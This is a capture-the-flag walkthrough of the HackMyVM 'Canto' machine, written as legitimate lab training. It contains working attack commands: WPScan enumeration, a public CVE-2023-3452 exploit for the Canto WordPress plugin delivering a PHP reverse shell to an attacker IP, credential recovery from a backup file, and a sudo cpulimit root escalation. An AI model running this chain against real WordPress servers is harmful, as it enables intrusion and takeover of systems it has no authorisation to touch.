# Canto — HackmyVm Writeup

Welcome to the **Canto** writeup! In this machine we cover the full hacking cycle:

- Reconnaissance
- Exploiting a vulnerable WordPress plugin
- Lateral movement via a password left in a backup file
- Privilege escalation

---

## 1. Reconnaissance

### Step 1 — Set up the working directory

Create a new directory on the Desktop named after the machine:

```bash
mkdir Canto
cd Canto
```

### Step 2 — Find the target's IP address

Scan the local network with ARP to find the Canto machine:

```bash
sudo arp-scan -I eth0 --localnet
```

```
192.168.15.16   08:00:27:94:41:98       PCS Systemtechnik GmbH
```

### Step 3 — Confirm the OS with a ping

```bash
ping 192.168.15.16
```

```
PING 192.168.15.16 (192.168.15.16) 56(84) bytes of data.
64 bytes from 192.168.15.16: icmp_seq=1 ttl=64 time=2.50 ms
64 bytes from 192.168.15.16: icmp_seq=2 ttl=64 time=1.48 ms
```

A TTL of **64** confirms this is a **Linux** machine.

### Step 4 — Port scan with Nmap

```bash
sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -n -Pn -vvv 192.168.15.16 -oN results.txt
```

```
22/tcp open  ssh     OpenSSH 9.3p1 Ubuntu 1ubuntu3.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.57 ((Ubuntu))
|_http-title: Canto
|_http-generator: WordPress 7.1.2
```

Two open ports: **22/TCP (SSH)** and **80/TCP (HTTP)**, running a **WordPress 7.1.2** site on Apache.

<img width="1283" alt="Website on target IP" src="https://github.com/user-attachments/assets/89ff444a-e946-4329-908a-6e57aa4c8ead" />

Checking the page source confirms the WordPress generator tag and reveals an exposed `xmlrpc.php` endpoint.

<img width="1355" alt="WordPress generator and xmlrpc" src="https://github.com/user-attachments/assets/a501018b-83a4-4e6f-935e-4450793779c2" />

---

## 2. Exploitation

### A. Enumerate users with WPScan

```bash
wpscan --url 'http://192.168.15.16/' -e u,p
```

```
[+] erik
 | Found By: Rss Generator (Passive Detection)
[i] 1 user(s) Identified.
```

A single user, **erik**, is identified. Attempting to log in with a wrong password at `/wp-login.php` confirms the account exists — the error message explicitly says the password is incorrect, not the username.

<img width="865" alt="wp-login confirms user exists" src="https://github.com/user-attachments/assets/7d592c8e-1695-4a15-9875-c49462134e5b" />

### B. Brute force — and pivot to plugin enumeration

```bash
wpscan --url 'http://192.168.15.16/' -U erik -P /usr/share/wordlists/rockyou.txt
```

This was taking far too long against `rockyou.txt`, so instead of brute-forcing the login, we pivot to enumerating installed **plugins** — a faster path to a foothold.

### C. Enumerate plugins with Gobuster

Download a WordPress plugin-name wordlist:

```bash
wget https://raw.githubusercontent.com/Perfectdotexe/WordPress-Plugins-List/refs/heads/master/plugins.txt
```

Run Gobuster against `/wp-content/plugins/`:

```bash
gobuster dir -u 'http://192.168.15.16/wp-content/plugins/' -w plugins.txt
```

```
akismet   (Status: 301) [Size: 335] [--> http://192.168.15.16/wp-content/plugins/akismet/]
canto     (Status: 301) [Size: 333] [--> http://192.168.15.16/wp-content/plugins/canto/]
```

A custom **canto** plugin stands out. Checking its readme confirms the version:

```
GET /wp-content/plugins/canto/readme.txt
```

<img width="986" alt="Plugin readme confirms version" src="https://github.com/user-attachments/assets/54f17ec9-6b9d-4548-8658-7c23d3a8d6ff" />

Stable tag: **3.0.4** — a version known to be vulnerable.

### D. Find and prepare the exploit

The plugin version matches **CVE-2023-3452** (a file-upload RCE). A public PoC is available:

```bash
git clone https://github.com/leoanggal1/CVE-2023-3452-PoC
cd CVE-2023-3452-PoC
```

### E. Generate a reverse shell payload

Use the **Reverse Shell Generator** website and select the **PentestMonkey PHP reverse shell** template.

<img width="892" alt="PentestMonkey option" src="https://github.com/user-attachments/assets/30cee072-4037-48d9-bc19-604ae8a7ce4b" />
<img width="1003" alt="php-reverse-shell.php template" src="https://github.com/user-attachments/assets/58df3c26-014b-4a54-b6ac-d97b6af8f052" />

Copy the generated code into a local file:

```bash
nano Wordpress_virus.php
```

<img width="1013" alt="Creating the payload file" src="https://github.com/user-attachments/assets/6df23091-16cd-423e-957b-a9fccad11702" />

**Important:** edit the payload to set your **attacker IP address** and listening port before saving.

<img width="404" alt="Setting the attacker IP" src="https://github.com/user-attachments/assets/1d918792-d70d-40be-877d-83081a0db1fc" />

Save with `Ctrl + O`, `Enter`, then exit with `Ctrl + X`.

### F. Start a listener and fire the exploit

```bash
sudo nc -nlvp 444
```

From a second terminal, run the PoC against the target, pointing it at the payload:

```bash
python3 CVE-2023-3452.py -u http://192.168.15.16 -LHOST 192.168.15.15 -NC_PORT 444 -s Wordpress_virus.php
```

The listener catches the connection:

```
listening on [any] 444 ...
connect to [192.168.15.15] from (UNKNOWN) [192.168.15.16] 46270
Linux canto 6.5.0-28-generic #29-Ubuntu SMP PREEMPT_DYNAMIC Thu Mar 28 23:46:48 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
```

We're in as **www-data**.

---

## 3. Stabilizing the Shell

```bash
script /dev/null -c bash
```

Then `Ctrl + Z`, followed by:

```bash
stty raw -echo; fg
reset xterm
export SHELL=bash
export TERM=xterm
```

Now using `Ctrl + C` or `clear` won't drop the connection.

---

## 4. Lateral Movement — From www-data to erik

### A. Explore erik's home directory

```bash
cd /home/erik
ls
# notes  user.txt
cat notes/Day1.txt
# On the first day I have updated some plugins and the website theme.
cat notes/Day2.txt
# I almost lost the database with my user so I created a backups folder.
```

The notes hint at a **backups** folder somewhere on the system.

### B. Find the backup and recover credentials

```bash
find / -name "backups" 2>/dev/null
```

```
/var/wordpress/backups
```

```bash
cat /var/wordpress/backups/12052024.txt
```

```
------------------------------------
| Users     |      Password        |
------------|----------------------|
| erik      | th1sIsTheP3ssw0rd!   |
------------------------------------
```

### C. Switch user

```bash
su erik
# Password: th1sIsTheP3ssw0rd!
```

We're now logged in as **erik**.

---

## 5. Privilege Escalation

Check for sudo rights:

```bash
sudo -l
```

```
User erik may run the following commands on canto:
    (ALL : ALL) NOPASSWD: /usr/bin/cpulimit
```

Looking up `cpulimit` on [GTFOBins](https://gtfobins.github.io/) confirms it can be abused to spawn a root shell.

<img width="1142" alt="GTFOBins cpulimit entry" src="https://github.com/user-attachments/assets/2459ce6a-187a-43ba-b22d-abc7f3bc4feb" />

```bash
sudo /usr/bin/cpulimit -l 100 -f /bin/bash
```

```
Process 1516 detected
root@canto:/# whoami
root
```

We're now **root**.

### Capturing the flags

```bash
find / -iname "user.txt" 2>/dev/null
find / -iname "root.txt" 2>/dev/null
```

| Flag | Location | Value |
|------|----------|-------|
| **User flag** | `/home/erik/user.txt` | `d41d8cd98f00b204e9800998ecf8427e` |
| **Root flag** | `/root/root.txt` | `1b56eefaab2c896e57c874a635b24b49` |

---

*Machine rooted — full cycle complete: recon → vulnerable plugin exploitation → credential discovery → privilege escalation.*





